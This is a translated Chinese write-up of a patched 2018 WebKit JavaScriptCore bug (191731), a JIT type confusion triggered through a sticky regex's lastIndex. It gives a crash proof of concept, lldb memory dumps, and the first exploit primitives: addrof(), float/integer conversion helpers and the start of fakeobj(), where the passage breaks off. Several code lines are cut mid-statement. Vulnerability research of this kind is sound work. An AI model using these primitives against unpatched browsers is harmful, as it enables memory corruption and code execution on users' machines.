# JavaScript engine exploit（二）
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
这是2018年底的一个关于正则的bug，编号是191731。
关于这个Bug的描述和Diff：[About The
Bug](https://bugs.webkit.org/show_bug.cgi?id=191731)、[Diff](https://github.com/WebKit/webkit/commit/7cf9d2911af9f255e0301ea16604c9fa4af340e2?diff=split#diff-fb5fbac6e9d7542468cfeed930e241c0L66)
切换到漏洞分支编译：
    git checkout 3af5ce129e6636350a887d01237a65c2fce77823
## 0x01 POC
    var victim_array = [1.1];
    var reg = /abc/y;
    var val = 5.2900040263529e-310
    var funcToJIT = function() {
        'abc'.match(reg);
        victim_array[0] = val;
    }
    for (var i = 0; i  203         return m_type == StringType;
       204     }
       205
       206     inline bool JSCell::isBigInt() const
    Target 0: (jsc) stopped.
这里引用了一个`this`，`this=0x0000616161616161`，这个数据的来源是POC中的val。
这里很明显传入了一个double，但是取出来的却是一个对象，然后引用这个对象的时候造成了崩溃。这里简单叙述一下POC的过程：
  1. 初始化一个Double数组。
  2. 初始化一个正则表达式对象，而且一定要加上`/y`标识。
  3. 随意初始化一个double变量。
  4. 创建一个函数，函数体内执行正则匹配，并对`victim_array[0]`传入double值。
  5. 让第四步创建的函数循环一万次，以触发JIT对它进行优化编译。
  6. 创建一个对象，重写该对象的`toString`方法，该方法给`victim_array[0]`赋值一个对象。
  7. 将`reg`的`lastIndex`属性赋值为刚创建的对象。
  8. 调用`funcToJIT`触发`toString`将`victim_array`转化为`JSValue`数组，然后放入val的值。
  9. 打印`victim_array[0]`触发对伪造对象的引用，引起崩溃。
上面提到了一定要加上`/y`标识，这是因为每个正则对象都有一个`lastIndex`属性，每次进行匹配的时候都会读取这个属性作为匹配字符串的开头，如果`lastIndex`为0就是从字符串开头进行匹配，如果`lastIndex`为1就是从第二个字符开始进行匹配。加上`/y`之后，正则对象每次都会读取这个值作为开头，而且不管匹配是否成功，都会将`lastIndex`设置为上一次匹配结束的位置。
但是`/g`也会读取`lastIndex`，为什么不用`/g`？因为`/g`修饰过的正则每次匹配必须从字符串开头进行，我猜测可能是每次匹配开始时都会将`lastIndex`设置为0，这就导致我们没法利用这个属性，因为每次重写都会被覆盖为0。
这个POC的关键点在于，最后传入val的时候，JSC为什么不认为`val`是double类型，而认为它是一个对象？
在最后执行`funcToJIT()`之前：
    >>> describe(victim_array)
    Object: 0x108ab4340 with butterfly 0x8000fe6a8 (Structure 0x108af2a70:[Array, {}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 98
执行完成后：
    >>> describe(victim_array)
    Object: 0x108ab4340 with butterfly 0x8000fe6a8 (Structure 0x108af2ae0:[Array, {}, ArrayWithContiguous, Proto:0x108ac80a0]), StructureID: 99
问题就出在`funcToJIT`中，我们可以认为这个函数执行了两个步骤，一个是执行`toString`，另一个就是`victim_array[0] =
val`。`toString`中执行`victim_array[0] =
{}`，这一步JSC就将数组变成了`ArrayWithContigous`，说明JSC是知道传入了一个对象的。而执行`victim_array[0] =
val`的时候，JSC就没认为它是一个double。这是因为`funcToJIT()`被JIT优化了，导致JSC没有对val的类型进行检查，也就没有对我们传入的值进行编码，我设置的`val=0x616161616161`，编码之后应该是`0x1616161616161`，这里没有编码，传进去之后就是原来的值，然而此时数组已经是`ArrayWithContigous`，根据JSC的`NaN-boxing`规则，`0x616161616161`就是一个指针。
double传入`ArrayWithDouble`-正常：
    (lldb) x/10gx 0x10000fe6c8
    0x10000fe6c8: 0x0000616161616161 0x00000000badbeef0
    0x10000fe6d8: 0x00000000badbeef0 0x00000000badbeef0
    0x10000fe6e8: 0x00000000badbeef0 0x00000000badbeef0
    0x10000fe6f8: 0x00000000badbeef0 0x00000000badbeef0
    0x10000fe708: 0x00000000badbeef0 0x00000000badbeef0
double传入`ArrayWithContigous`-正常：
    (lldb) x/10gx 0x10000fe6a8
    0x10000fe6a8: 0x0001616161616161 0x00000000badbeef0
    0x10000fe6b8: 0x00000000badbeef0 0x00000000badbeef0
    0x10000fe6c8: 0x00000000badbeef0 0x00000000badbeef0
    0x10000fe6d8: 0x00000000badbeef0 0x00000000badbeef0
    0x10000fe6e8: 0x00000000badbeef0 0x00000000badbeef0
double传入`ArrayWithContigous`-POC：
    (lldb) x/10gx 0x10000fe6a8
    0x10000fe6a8: 0x0000616161616161 0x00000000badbeef0
    0x10000fe6b8: 0x00000000badbeef0 0x00000000badbeef0
    0x10000fe6c8: 0x00000000badbeef0 0x00000000badbeef0
    0x10000fe6d8: 0x00000000badbeef0 0x00000000badbeef0
    0x10000fe6e8: 0x00000000badbeef0 0x00000000badbeef0
关于JIT的优化流程和内部细节可以看官方文档的描述：[Introducing the webkit ftl-jit](https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/)
文档中有描述一个函数被调用多少次会触发DFG，
> The first execution of any function always starts in the interpreter tier.
> As soon as any statement in the function executes more than 100 times, or
> the function is called more than 6 times (whichever comes first), execution
> is diverted into code compiled by the _Baseline_ JIT. This eliminates some
> of the interpreter’s overhead but lacks any serious compiler optimizations.
> Once any statement executes more than 1000 times in _Baseline_ code, or the
> _Baseline_ function is invoked more than 66 times, we divert execution
> again, to the DFG JIT.
但是我实际测试过程中我把`funcToJIT()`的调用次数调到3670，就只是有几率触发DFG，所以还是把调用次数调大一点比较稳，但也不能太大，调用次数过多就会进入FTL。
## 0x02 Exploit
POC中通过传入设定好的double值成功伪造了一个指针，其实用相反的手法我们是可以做到泄漏对象地址的。我们可以先在数组中放入对象指针，然后以double的形式将指针打印出来，构造出来的`addrof()`原语如下：
    function addrof(obj){
        var victim_array = [1.1];
        var reg = /abc/y;
        var funcToJIT = function(array){
            'abc'.match(reg);
            return array[0];
        }
        for(var i=0; i>>
但是返回的是double的形式，我没找到JavaScript有啥格式化比较方便的方法，最后看niklasb大佬的exp发现可以用`ArrayBuffer`解决，代码如下：
    var buffer = new ArrayBuffer(8);
    var u8 = new Uint8Array(buffer);
    var u32 = new Uint32Array(buffer);
    var f64 = new Float64Array(buffer);
    var BASE = 0x100000000;
    function i2f(i) {
        u32[0] = i%BASE;
        u32[1] = i/BASE;
        return f64[0];
    }
    function f2i(f) {
        f64[0] = f;
        return u32[0] + BASE*u32[1];
    }
    function hex(x) {
        if (x >> test = {}
    [object Object]
    >>> hex(f2i(addrof(test)))
    0x1082b00c0
    >>> describe(test)
    Object: 0x1082b00c0 with butterfly 0x0 (Structure 0x1082f20d0:[Object, {}, NonArray, Proto:0x1082b4000]), StructureID: 76
    >>>
可以看到确实泄漏出了对象的地址。
根据poc再构造一个`fakeobj()`：
    function fakeobj(addr){
        var victim_array = [1.1];
        var reg = /abc/y;